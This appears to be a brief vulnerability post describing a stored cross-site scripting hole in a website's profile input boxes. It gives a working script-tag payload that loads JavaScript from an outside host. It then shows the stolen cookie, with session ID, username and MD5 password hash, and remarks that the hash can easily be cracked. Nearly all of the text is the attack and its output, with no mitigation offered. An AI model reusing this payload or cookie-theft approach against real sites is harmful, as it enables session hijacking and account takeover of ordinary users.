XSS Vuln with cookie disclosure in profile input boxes:

No filter evasion needed here. For PoC try putting <SCRIPT SRC=http://ha.youfucktard.com/xss.js></SCRIPT> in Music/Video input box.

And the cookie data we see is:
This is remote text via xss.js located at youfucktard.com PHPSESSID=bdee69f9a82b5333bc365f01447b8afc; db_user=luny666; loggedin=1; status=0; sessuid=18304; md5pass=91da4589b012c2fe1ceac1fb2363dbc6; onlineid=274562 


Breaking down our cookie:
PHPSESSID = (Our php session ID)

db_user= (Our username)

loggedin= (Logged in:yes)

staus=0 (Probably means our profile has not been approved yet

sessuid = (Session userid)

md5pass= (md5 hash of our password)

onlineid= (Our userid #)

So, now we know our username (luny666) and our password hash, which can easily be cracked.
